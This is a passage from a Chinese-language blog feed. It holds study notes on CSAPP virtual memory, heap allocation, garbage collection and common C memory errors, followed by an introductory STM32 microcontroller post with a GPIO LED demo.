title="结合高速缓存和虚拟内存"></a>结合高速缓存和虚拟内存</h4><p>大多数系统是选择物理寻址的。使用物理寻址，多个进程同时在高速缓存中有存储块和共享来自相同虚拟页面的块成为很简单的事情。而且，高速缓存无需处理保护问题，因为访问权限的检查是地址翻译过程的一部分。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240628164608051.png" alt="image-20240628164608051"></p><h4 id="利用TLB加速地址翻译"><a href="#利用TLB加速地址翻译" class="headerlink" title="利用TLB加速地址翻译"></a>利用TLB加速地址翻译</h4><p>翻译后备缓冲器（Translation Lookaside Buffer，简称TLB）是一个用于改进虚拟内存系统性能的硬件缓存。在操作系统中，TLB用来减少处理器处理内存时地址转换的延迟。</p><p>当CPU接收到一个虚拟地址时，它首先在TLB中查找。如果找到了对应的物理地址，那么就可以直接使用，这被称为TLB命中（TLB Hit）。如果没有找到，即TLB未命中（TLB Miss），系统就必须查询内存中的页表，并将结果存入TLB中以便后续使用。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240628165020124.png" alt="image-20240628165020124"></p><h4 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h4><p>采用多层次的页表，虚拟内存地址被分成多个部分，每一部分用于索引不同级别的页表。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240628170122691.png" alt="image-20240628170122691"></p><h4 id="综合：端到端的地址翻译"><a href="#综合：端到端的地址翻译" class="headerlink" title="综合：端到端的地址翻译"></a>综合：端到端的地址翻译</h4><p>//TODO</p><h3 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h3><p><code>内存映射(memory mapping)</code>：将一个虚拟内存区域与一个磁盘上的对象(object) 关联起来</p><ul><li>一个区域可以映射到一个普通磁盘文件的连续部分。</li><li>一个区域也可以映射到一个<code>匿名文件</code>，<code>匿名文件</code>是由内核创建的，包含的全是二进制零。<code>匿名文件</code>可用于内存分配、进程间通信（IPC）、性能优化、用户空间分配器、操作系统内核、沙箱环境、虚拟化技术。</li></ul><h4 id="再看共享对象"><a href="#再看共享对象" class="headerlink" title="再看共享对象"></a>再看共享对象</h4><ul><li>对象可被映射为<code>共享对象</code>和<code>私有对象</code>。</li><li>即使<code>共享对象</code>被映射到了多个共享区域，物理内存中也只需要存放共享对象的一个副本。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240411171229982.png" alt="image-20240411171229982"></p><p><strong>写时复制（copy-on-write）</strong></p><ul><li><p>当多个进程将一个私有对象映射到内存时，如<code>图a</code>所示，该页表条目被标记为<code>只读</code>，区域结构被标记为<code>写时复制</code>，只要没有进程执行写操作，就保持图a的状态。  </p></li><li><p>当进程试图写该私有对象时，触发<code>保护</code>故障，进入<code>故障处理程序</code>,返回后进入<code>图b</code>状态。  </p></li><li>通过延迟私有对象中的副本直到最后可能的时刻，写时复制最充分地使用了稀有的物理内存。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240411172044441.png" alt="image-20240411172044441"></p><h4 id="再看fork函数"><a href="#再看fork函数" class="headerlink" title="再看fork函数"></a>再看fork函数</h4><ul><li>当fork 函数被当前进程调用时，内核为新进程创建各种<code>数据结构</code>，并分配给它一个唯一的<code>PID</code> 。为了给这个新进程创建虚拟内存，它创建了当前进程的<code>mm_struct 、区域结构和页表的原样副本</code>。它将两个进程中的<code>每个页面都标记为只读</code>，并将两个进程中的每个区域结构都标记为私有的写时复制。</li><li>当fork 在新进程中返回时，新进程现在的虚拟内存刚好和调用fork 时存在的虚拟内存<code>相同</code>。当这两个进程中的任一个后来进行写操作时，写时复制机制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。</li></ul><h4 id="再看execve函数"><a href="#再看execve函数" class="headerlink" title="再看execve函数"></a>再看execve函数</h4><ul><li><strong>删除已存在的用户区域</strong>。删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li><strong>映射私有区域</strong>。为新程序的代码、数据、bss 和栈区域创建新的区域结构。所有这些新的区域都是<code>私有的、写时复制</code>的。<code>代码</code>和<code>数据区域</code>被映射为a.out 文件中的<code>.text</code>和<code>.data 区</code>。<code>bss 区域</code>是<code>请求二进制零</code>的，<code>映射到匿名文件</code>，其大小包含在a.out 中。<code>栈</code>和<code>堆</code>区域也是<code>请求二进制零</code>的，初始长度为零。但是栈内存不是通过匿名文件映射来实现的，而是直接由内核管理的。当使用<code>brk()</code>和<code>sbrk()</code>时，堆内存的扩展是通过改变进程的<code>program break</code>来实现的，这并<code>不涉及匿名文件映射</code>。当使用<code>mmap()</code>来分配内存时，可以映射到<code>匿名文件（anonymous file）</code>，这种方式称为匿名内存映射。这种映射不与磁盘上的实际文件关联，而是直接映射到虚拟内存中的区域。</li><li><strong>映射共享区域</strong>。如果a.out 程序与共享对象（或目标）链接，比如标准C 库<code>libc.so</code>, 那么这些对象都是动态链接到这个程序的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li><strong>设置程序计数器(PC)</strong> 。<code>execve</code> 做的最后一件事情就是设置当前进程上下文中的<code>程序计数器</code>，使之指向代码区域的入口点。下一次调度这个进程时，它将从这个入口点开始执行。Linux 将根据需要换入代码和数据页面。</li></ul><h4 id="使用mmap函数的用户级内存映射"><a href="#使用mmap函数的用户级内存映射" class="headerlink" title="使用mmap函数的用户级内存映射"></a>使用mmap函数的用户级内存映射</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt; </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags,<span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length)</span>;</span><br></pre></td></tr></table></figure><p>mmap 函数要求内核创建一个新的虚拟内存区域， 最好是从地址 start 开始的一个区 域， 并将文件描述符 fd 指定的对象的一个连续的片(chunk)映射到这个新的区域。 连续的 对象片大小为 length 字节， 从距文件开始处偏移量为 offset 字节的地方开始。 </p><ul><li>PROT_EXEC: 这个区域内的页面由可以被CPU执行的指令组成。</li><li>PROT_READ: 这个区域内的页面可读。</li><li>PROT _WRITE: 这个区域内的页面可写。</li><li>PROT _NONE: 这个区域内的页面不能被访问。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627232715280.png" alt="image-20240627232715280"></p><h3 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240411173846341.png" alt="image-20240411173846341"></p><ul><li>动态内存分配器维护着一个进程的虚拟内存区域，称为<code>堆(heap)</code>。</li><li><p>对于<code>每个进程</code>内核维护着一个<code>brk</code>变量指向堆顶</p></li><li><p>显式内存分配器：<code>C</code>的<code>malloc</code>和<code>free</code>，<code>C++</code>的<code>new</code>和<code>delete</code>。</p></li><li>隐式内存分配器：通过<code>垃圾回收器</code>回收，如java。</li></ul><h4 id="malloc和free函数"><a href="#malloc和free函数" class="headerlink" title="malloc和free函数"></a>malloc和free函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分配指定大小的内存块，并返回指向该内存块起始地址的指针。分配的内存块中的内容是未初始化的。 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分配指定数量的指定大小的内存块，并将其内容初始化为零。 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">calloc</span><span class="params">(<span class="type">size_t</span> nmemb, <span class="type">size_t</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 重新分配之前分配的内存块的大小，并返回指向新内存块的指针。如果新分配的大小比旧分配的大小大，那么新分配的内存块可能与旧内存块相同，否则，它可能是一个新的内存块。 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 释放 分配的内存块。注意：在释放内存块后，指向该内存块的指针将不再有效，任何对该指针的后续访问都可能导致未定义的行为。 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加程序的数据段的大小，即在堆上分配一定大小的内存空间。通常在内部由 malloc() 等函数调用。 */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">sbrk</span><span class="params">(<span class="type">intptr_t</span> incr)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="为什么要使用动态内存分配"><a href="#为什么要使用动态内存分配" class="headerlink" title="为什么要使用动态内存分配"></a>为什么要使用动态内存分配</h4><ul><li>因为只有直到程序实际实际运行时才知道某些数据结构的大小</li></ul><h4 id="分配器的要求和目标"><a href="#分配器的要求和目标" class="headerlink" title="分配器的要求和目标"></a>分配器的要求和目标</h4><p>要求：</p><ul><li>处理任意请求序列。</li><li>立即响应请求。 分配器必须立即响应分配请求。 </li><li>不允许分配器为了提高性能 重新排列或者缓冲请求。只使用堆。</li><li>对齐块（对齐要求）。 分配器必须对齐块， 使得它们可以保存任何类型的数据对象。</li></ul><p>目标: </p><ul><li>最大化吞吐率。</li><li>最大化内存利用率。</li></ul><h4 id="碎片"><a href="#碎片" class="headerlink" title="碎片"></a>碎片</h4><ul><li><strong>内部碎片：</strong>分配块大小和它们的有效载荷大小之差的和。在任意时刻，内部碎片的数量只取决于以前请求的模式和分配器的实现方式。</li><li>外部碎片：外部碎片是当空闲内存合计起来足够满足一个分配请求，但是没有一个单独的空闲块足够大可以来处理这个请求时发生的。不仅取决于以前请求的模式和分配器的实现方式， 还取决千将来请求的模式。 </li></ul><h4 id="放置已分配的块"><a href="#放置已分配的块" class="headerlink" title="放置已分配的块"></a>放置已分配的块</h4><ul><li>首次适配：这种策略会搜索内存的第一个足够大的空闲块来满足请求。首次适配简单且执行速度快，但可能会导致内存碎片。</li><li>下一次适配：下一次适配不会每次都从内存列表的开始处查找，而是从上次分配的位置继续查找。这可以减少内存碎片，但性能上可能不如首次适配。</li><li>最佳适配：最佳适配策略寻找最接近所需大小的空闲内存块。这种方法可以最小化内存碎片。但是，最佳适配可能需要更多的时间来搜索合适的空闲块，因为它必须检查所有的空闲块以找到最佳匹配。</li></ul><h4 id="获取额外内存"><a href="#获取额外内存" class="headerlink" title="获取额外内存"></a>获取额外内存</h4><p>通过sbrk函数</p><h4 id="合并空闲块"><a href="#合并空闲块" class="headerlink" title="合并空闲块"></a>合并空闲块</h4><ul><li>立即合并</li><li>推迟合并</li></ul><h4 id="带边界标记的合并"><a href="#带边界标记的合并" class="headerlink" title="带边界标记的合并"></a>带边界标记的合并</h4><p>通过在每一个块尾部添加一个脚部来实现块的合并（会增大内存开销），可分为以下四种情况：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627223704750.png" alt="image-20240627223704750"></p><h4 id="综合：实现一个简单的分配器"><a href="#综合：实现一个简单的分配器" class="headerlink" title="综合：实现一个简单的分配器"></a>综合：实现一个简单的分配器</h4><p>malloc lab</p><h4 id="显式空闲列表"><a href="#显式空闲列表" class="headerlink" title="显式空闲列表"></a>显式空闲列表</h4><p>通过添加祖先和后继节点加快分配时空闲块的访问速度。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627223736177.png" alt="image-20240627223736177"></p><h4 id="分离的空闲列表"><a href="#分离的空闲列表" class="headerlink" title="分离的空闲列表"></a>分离的空闲列表</h4><p>将{1}，{2}，{4}…..{2^10}等不同大小的空闲块按照2的幂分类，每个类组成一个空闲链表</p><ol><li><p>简单分离存储：不对空闲块进行分割合并。因此只需要succ指针，最小块为一个字。但是会造成很多内部碎片和外部碎片。</p></li><li><p>分离适配：GNU malloc包采用此方法，即找到合适块后，（可选地）分割它，将剩余部分插入其他适当空闲链表。释放一个块，执行合并，将结果放置到对应地空闲链表中。</p></li><li><p>伙伴系统：</p><ul><li>每个块都有一个伙伴，伙伴的大小相同，位置相邻。如果一个块位于地址A，那么它的伙伴就位于地址A±块大小。这样，内存就被组织成了一个伙伴对的双向链表。</li><li><p>当需要分配内存时，系统会查找大小最接近所需大小的块。如果找到的块太大，就会被分裂成两个较小的块，每个块都是原块大小的一半。这个过程会一直重复，直到找到大小合适的块为止。</p></li><li><p>当释放内存时，系统会检查释放的块的伙伴是否也是空闲的。如果是，那么这两个伙伴块会被合并成一个更大的块，并放回到块链表中。这个过程可能会递归进行，如果更大的伙伴块也是空闲的，它们也会被合并。</p></li><li>优点是能快速搜索和快速合并，缺点是可能导致显著的内存碎片。</li></ul></li></ol><h3 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h3><h4 id="垃圾收集的基本知识"><a href="#垃圾收集的基本知识" class="headerlink" title="垃圾收集的基本知识"></a>垃圾收集的基本知识</h4><p>垃圾收集器(garbage collector)是一种动态内存分配器，它自动释放程序不再需要的已分配块。</p><p>垃圾收集器将内存视为一张有向可达图(reachability graph)：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627230439248.png" alt="image-20240627230439248"></p><p>无论何时需要堆空间时，应用都会用通常的方式调用malloc。 如果malloc找不到一个合适的空闲块， 那么它就调用垃圾收集器， 希望能够回收一些垃圾到空闲链表 。收集器识别出垃圾块，并通过调用free函数将它们返回给堆 。关键的思想是收集器代替应用去调用free。 </p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627230646589.png" alt="image-20240627230646589"></p><h4 id="Mark-amp-Sweep垃圾收集器"><a href="#Mark-amp-Sweep垃圾收集器" class="headerlink" title="Mark&amp;Sweep垃圾收集器"></a>Mark&amp;Sweep垃圾收集器</h4><p>Mark&amp;Sweep垃圾收集器由标记(mark)阶段和清除(sweep)阶段组成，标记阶段标记出根节点的所有可达的和已分配的后继， 而后面的清除阶段释放每个未被标记的已分配块。 块头部中空闲的低位中的一位通常用来表示这个块是否被标记了 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627230811901.png" alt="image-20240627230811901"></p><h4 id="C程序的保守Mark-amp-Sweep"><a href="#C程序的保守Mark-amp-Sweep" class="headerlink" title="C程序的保守Mark&amp;Sweep"></a>C程序的保守Mark&amp;Sweep</h4><p>C程序的Mark &amp; Sweep收集器必须是保守的， 其根本原因是C语言不会用类型信息来标记内存位置。 </p><h3 id="C程序常见的与内存有关的错误"><a href="#C程序常见的与内存有关的错误" class="headerlink" title="C程序常见的与内存有关的错误"></a>C程序常见的与内存有关的错误</h3><h4 id="间接引用坏指针"><a href="#间接引用坏指针" class="headerlink" title="间接引用坏指针"></a>间接引用坏指针</h4><p>注意需要的是<code>指针指向的地址</code>还是<code>指针指向的地址的值</code></p><h4 id="读未初始化的内存"><a href="#读未初始化的内存" class="headerlink" title="读未初始化的内存"></a>读未初始化的内存</h4><p>注意malloc等部分函数得到的地址是未初始化的，我们不能假设其全为0，可以使用calloc代替或显示初始化为0。</p><h4 id="允许栈缓冲区溢出"><a href="#允许栈缓冲区溢出" class="headerlink" title="允许栈缓冲区溢出"></a>允许栈缓冲区溢出</h4><p>避免使用gets等危险函数，否则输入可能会大于容纳数组的大小。</p><h4 id="假设指针和它们所指向的对象时相同大小的"><a href="#假设指针和它们所指向的对象时相同大小的" class="headerlink" title="假设指针和它们所指向的对象时相同大小的"></a>假设指针和它们所指向的对象时相同大小的</h4><p><code>sizeof(int)</code>和<code>sizeof(int *)</code>在64位机器上大小是不同的。</p><h4 id="造成错位错误"><a href="#造成错位错误" class="headerlink" title="造成错位错误"></a>造成错位错误</h4><p>注意对内存的操作不要越界</p><h4 id="引用指针，而不是它所指向的对象"><a href="#引用指针，而不是它所指向的对象" class="headerlink" title="引用指针，而不是它所指向的对象"></a>引用指针，而不是它所指向的对象</h4><p>采用括号来避免可能发生的优先级错误</p><h4 id="误解指针运算"><a href="#误解指针运算" class="headerlink" title="误解指针运算"></a>误解指针运算</h4><p>不同类型的指针步长不同，但我们访问指针的下一元素只需要将指针+1即可。</p><h4 id="引用不存在的变量"><a href="#引用不存在的变量" class="headerlink" title="引用不存在的变量"></a>引用不存在的变量</h4><p>禁止返回临时变量。</p><h4 id="引用空闲堆块中的数据"><a href="#引用空闲堆块中的数据" class="headerlink" title="引用空闲堆块中的数据"></a>引用空闲堆块中的数据</h4><p>在malloc后free掉的数据不能够再次使用。</p><h4 id="引起内存泄露"><a href="#引起内存泄露" class="headerlink" title="引起内存泄露"></a>引起内存泄露</h4><p>别忘了free！！！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stm32单片机0x1</title>
      <link href="/2024/02/15/stm32/stm32%E5%8D%95%E7%89%87%E6%9C%BA0x1/"/>
      <url>/2024/02/15/stm32/stm32%E5%8D%95%E7%89%87%E6%9C%BA0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="stm32"><a href="#stm32" class="headerlink" title="stm32"></a>stm32</h1><p>STM32是ST公司基于ARM Cortex-M内核开发的32位微控制器</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215221142130.png" alt="image-20240215221142130"></p><p><strong>ARM内核</strong></p><p><strong>stm32F103C8T6</strong>采用<strong>Cortex-M3内核</strong>，发布于2004年10月。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215222601800.png" alt="image-20240215222601800"></p><p><strong>片上资源/外设</strong></p><div class="table-container"><table><thead><tr><th><strong>英文缩写</strong></th><th><strong>名称</strong></th><th><strong>英文缩写</strong></th><th><strong>名称</strong></th></tr></thead><tbody><tr><td>NVIC</td><td>嵌套向量中断控制器</td><td>CAN</td><td>CAN通信</td></tr><tr><td>SysTick</td><td>系统滴答定时器</td><td>USB</td><td>USB通信</td></tr><tr><td>RCC</td><td>复位和时钟控制</td><td>RTC</td><td>实时时钟</td></tr><tr><td>GPIO</td><td>通用IO口</td><td>CRC</td><td>CRC校验</td></tr><tr><td>AFIO</td><td>复用IO口</td><td>PWR</td><td>电源控制</td></tr><tr><td>EXTI</td><td>外部中断</td><td>BKP</td><td>备份寄存器</td></tr><tr><td>TIM</td><td>定时器</td><td>IWDG</td><td>独立看门狗</td></tr><tr><td>ADC</td><td>模数转换器</td><td>WWDG</td><td>窗口看门狗</td></tr><tr><td>DMA</td><td>直接内存访问</td><td>DAC</td><td>数模转换器</td></tr><tr><td>USART</td><td>同步/异步串口通信</td><td>SDIO</td><td>SD卡接口</td></tr><tr><td>I2C</td><td>I2C通信</td><td>FSMC</td><td>可变静态存储控制器</td></tr><tr><td>SPI</td><td>SPI通信</td><td>USB OTG</td><td>USB主机接口</td></tr></tbody></table></div><p><strong>命名规则</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240215223332903.png" alt="image-20240215223332903"></p><p><strong>系统结构</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216095057995.png" alt="image-20240216095057995"></p><p><strong>引脚定义</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216105401008.png" alt="image-20240216105401008"></p><font color=Red>红色：电源相关引脚</font><font color=Blue>蓝色：最小系统相关引脚</font><font color=Green>绿色：IO口、功能口</font><p>有FT可以接上5V电压，没有FT只能容忍3.3V电压。</p><p>主功能：上电默认功能</p><p>stm32采用分区供电，有多个供电引脚</p><p><strong>存储器映像</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216111430685.png" alt="image-20240216111430685"></p><h3 id="启动配置"><a href="#启动配置" class="headerlink" title="启动配置"></a>启动配置</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216112349728.png" alt="image-20240216112349728"></p><ul><li>从主闪存存储器启动：主闪存存储器被映射到启动空间(0x0000 0000)，但仍然能够在它原有的地址(0x0800 0000)访问它，即闪存存储器的内容可以在两个地址区域访问，0x0000 0000或0x0800 0000。</li><li>从系统存储器启动：系统存储器被映射到启动空间(0x0000 0000)，但仍然能够在它原有的地址访问它。</li><li>从内置SRAM启动：只能在0x2000 0000开始的地址区访问SRAM。</li><li><code>主闪存存储器模式</code>，正常执行闪存里面的程序。</li><li><code>系统存储器模式</code>，串口下载，系统存储器存储bootlooder程序。内嵌的自举程序存放在系统存储区，由ST在生产线上写入，用于通过可用的串行接口对闪存存储器进行重新编程。</li><li><p><code>内置SRAM</code>模式，程序调试。</p></li><li><p>在系统复位后，SYSCLK的第4个上升沿，BOOT引脚的值将被锁存。即引脚20中的BOOT1功能转变为PB2功能</p></li></ul><h3 id="最小系统电路"><a href="#最小系统电路" class="headerlink" title="最小系统电路"></a>最小系统电路</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216113726941.png" alt="image-20240216113726941"></p><p>STM32核心板</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216115654560.png" alt="image-20240216115654560"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216120032879.png" alt="image-20240216120032879"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240216120448650.png" alt="image-20240216120448650"></p><p><strong>C语言数据类型</strong></p><div class="table-container"><table><thead><tr><th><strong>关键字</strong></th><th><strong>位数</strong></th><th><strong>表示范围</strong></th><th>stdint关键字</th><th>ST关键字</th></tr></thead><tbody><tr><td>char</td><td>8</td><td>-128 ~ 127</td><td>int8_t</td><td>s8</td></tr><tr><td>unsigned char</td><td>8</td><td>0 ~ 255</td><td>uint8_t</td><td>u8</td></tr><tr><td>short</td><td>16</td><td>-32768 ~ 32767</td><td>int16_t</td><td>s16</td></tr><tr><td>unsigned short</td><td>16</td><td>0 ~ 65535</td><td>uint16_t</td><td>u16</td></tr><tr><td>int</td><td>32</td><td>-2147483648 ~ 2147483647</td><td>int32_t</td><td>s32</td></tr><tr><td>unsigned int</td><td>32</td><td>0 ~ 4294967295</td><td>uint32_t</td><td>u32</td></tr><tr><td>long</td><td>32</td><td>-2147483648 ~ 2147483647</td><td></td><td></td></tr><tr><td>unsigned long</td><td>32</td><td>0 ~ 4294967295</td><td></td><td></td></tr><tr><td>long long</td><td>64</td><td>-(2^64)/2 ~ (2^64)/2-1</td><td>int64_t</td><td></td></tr><tr><td>unsigned long long</td><td>64</td><td>0 ~ (2^64)-1</td><td>uint64_t</td><td></td></tr><tr><td>float</td><td>32</td><td>-3.4e38 ~ 3.4e38</td><td></td><td></td></tr><tr><td>double</td><td>64</td><td>-1.7e308 ~ 1.7e308</td><td></td></tr></tbody></table></div><blockquote><p>typedef和define的区别</p><p>（1）原理不同</p><h1 id="define是C语言中定义的语法，是预处理指令，在预处理时进行简单而机械的字符串替换，不作正确性检查，只有在编译已被展开的源程序时才会发现可能的错误并报错。"><a href="#define是C语言中定义的语法，是预处理指令，在预处理时进行简单而机械的字符串替换，不作正确性检查，只有在编译已被展开的源程序时才会发现可能的错误并报错。" class="headerlink" title="define是C语言中定义的语法，是预处理指令，在预处理时进行简单而机械的字符串替换，不作正确性检查，只有在编译已被展开的源程序时才会发现可能的错误并报错。"></a>define是C语言中定义的语法，是预处理指令，在预处理时进行简单而机械的字符串替换，不作正确性检查，只有在编译已被展开的源程序时才会发现可能的错误并报错。</h1><p>typedef是关键字，在编译时处理，有类型检查功能。它在自己的作用域内给一个已经存在的类型一个别名，但不能在一个函数定义里面使用typedef。用typedef定义数组、指针、结构等类型会带来很大的方便，不仅使程序书写简单，也使意义明确，增强可读性。</p><p>（2）功能不同</p><p>typedef用来定义类型的别名，起到类型易于记忆的功能。另一个功能是定义机器无关的类型。如定义一个REAL的浮点类型，在目标机器上它可以获得最高的精度：typedef long double REAL， 在不支持long double的机器上，看起来是这样的，typedef double REAL，在不支持double的机器上，是这样的，typedef float REAL</p><h1 id="define不只是可以为类型取别名，还可以定义常量、变量、编译开关等。"><a href="#define不只是可以为类型取别名，还可以定义常量、变量、编译开关等。" class="headerlink" title="define不只是可以为类型取别名，还可以定义常量、变量、编译开关等。"></a>define不只是可以为类型取别名，还可以定义常量、变量、编译开关等。</h1><p>（3）作用域不同</p><h1 id="define没有作用域的限制，只要是之前预定义过的宏，在以后的程序中都可以使用，而typedef有自己的作用域。"><a href="#define没有作用域的限制，只要是之前预定义过的宏，在以后的程序中都可以使用，而typedef有自己的作用域。" class="headerlink" title="define没有作用域的限制，只要是之前预定义过的宏，在以后的程序中都可以使用，而typedef有自己的作用域。"></a>define没有作用域的限制，只要是之前预定义过的宏，在以后的程序中都可以使用，而typedef有自己的作用域。</h1><p><a href="https://blog.csdn.net/summer00072/article/details/80918483">typedef和define有什么区别_define和typedef的区别-CSDN博客</a></p></blockquote><p>结构体struct：数据打包，不同类型变量的集合，因为结构体变量类型较长，所以通常用typedef更改变量类型名。</p><p>枚举enum：定义一个取值受限制的整型变量，用于限制变量取值范围；宏定义的集合</p><h3 id="STM32新建工程"><a href="#STM32新建工程" class="headerlink" title="STM32新建工程"></a>STM32新建工程</h3><p><strong>工程架构</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218050800447.png" alt="image-20240218050800447"></p><p><strong>步骤</strong></p><ul><li>建立工程文件夹，Keil中新建工程，选择型号</li><li>工程文件夹里建立Start、Library、User等文件夹，复制固件库里面的文件到工程文件夹，保持工程独立性</li><li>工程里对应建立Start、Library、User等同名称的分组，然后将文件夹内的文件添加到工程分组里</li><li>工程选项，C/C++，Include Paths内声明所有包含头文件的文件夹</li><li>工程选项，C/C++，Define内定义USE_STDPERIPH_DRIVER</li><li>工程选项，Debug，下拉列表选择对应调试器，Settings，Flash Download里勾选Reset and <strong>Run</strong></li></ul><p>这里比较复杂直接看视频就行，下面是一个demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span>                  <span class="comment">// Device header</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//RCC-&gt;APB2ENR = 0x00000010;使用寄存器</span></span><br><span class="line"><span class="comment">//GPIOC-&gt;CRH = 0x00300000;</span></span><br><span class="line"><span class="comment">//GPIOC-&gt;ODR = 0x00002000;</span></span><br><span class="line">RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC,ENABLE);<span class="comment">//使用标准库</span></span><br><span class="line">GPIO_InitTypeDef GPIO_InitStructure;</span><br><span class="line">GPIO_InitStructure.GPIO_Mode =  GPIO_Mode_Out_PP;</span><br><span class="line">GPIO_InitStructure.GPIO_Pin = GPIO_Pin_13;</span><br><span class="line">GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">GPIO_Init(GPIOC,&amp;GPIO_InitStructure);</span><br><span class="line"><span class="comment">//GPIO_SetBits(GPIOC,GPIO_Pin_13);//设置高电平，灭灯</span></span><br><span class="line">GPIO_ResetBits(GPIOC,GPIO_Pin_13);<span class="comment">//设置低电平，电灯</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="GPIO"><a href="#GPIO" class="headerlink" title="GPIO"></a>GPIO</h3><p><strong>基本结构</strong></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240218053705572.png" 